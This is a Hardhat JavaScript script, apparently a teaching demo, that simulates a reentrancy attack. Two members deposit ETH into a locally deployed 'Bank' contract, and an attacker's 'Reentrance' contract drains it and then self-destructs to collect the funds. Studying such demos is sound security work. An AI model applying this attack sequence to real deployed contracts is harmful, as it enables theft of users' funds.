//
// @dev Simulate a reentrance attack
// @description Contract calls a receive()/fallback() func when the token is sent.
// Using above description to launch a reentrancy attack
//
// @reference https://learnblockchain.cn/article/3278, or other hardhat sample:
// https://learnblockchain.cn/article/4166
//

const { ethers } = require('hardhat');

async function main() {
    const [ owenr, member1, member2, attacker] = await ethers.getSigners();

    const Bank = await ethers.getContractFactory('Bank', owenr);
    const bank = await Bank.deploy();
    await bank.deployed();

    const Reentrance = await ethers.getContractFactory('Reentrance', attacker);
    const reentrance = await Reentrance.deploy(bank.address);
    await reentrance.deployed();

    // member1 deposits ETH
    console.log(`\n==== Member1 deposit 5 ETH ====`);
    await bank.connect(member1).deposit({value: ethers.utils.parseEther('5.0')});
    console.log(`member1 balance: ${ethers.utils.formatEther(await bank.memberBalance(member1.address))} ETH`);
    console.log(`contract Bank balance: ${ethers.utils.formatEther(await bank.getBalance())} ETH\n`);

    // member2 deposits ETH
    console.log(`==== Member2 deposit 10 ETH ====`);
    await bank.connect(member2).deposit({value: ethers.utils.parseEther('10.0')});
    console.log(`member2 balance: ${ethers.utils.formatEther(await bank.memberBalance(member2.address))} ETH`);
    console.log(`contract Bank balance: ${ethers.utils.formatEther(await bank.getBalance())} ETH\n`);

    // attacker attacks Bank contract
    console.log(`==== Attacker launches a Reentrancy attack to Bank contract ====`);
    console.log(`Attacker recharges 1 ether to contract...`);
    console.log(`Attacker calls attackBank func with 1 ether...`);
    await reentrance.connect(attacker).attackBank({value: ethers.utils.parseEther('1.0')});
    console.log(`contract Reentrance balance: ${ethers.utils.formatEther(await reentrance.getBalance())} ETH`);
    console.log(`contract Bank balance: ${ethers.utils.formatEther(await bank.getBalance())} ETH`);
    console.log(`attacker balance: ${ethers.utils.formatEther(await attacker.getBalance())} ETH\n`);

    // attacker destruct contract and send ETH to himself
    console.log(`== Attacker destruct contract ==`);
    await reentrance.connect(attacker).goodbye();
    console.log(`attacker balance: ${ethers.utils.formatEther(await attacker.getBalance())} ETH\n`);

}

main()
    .then(() => process.exit(0))
    .catch((err) => {
        console.error(err);
        process.exit(1);
    });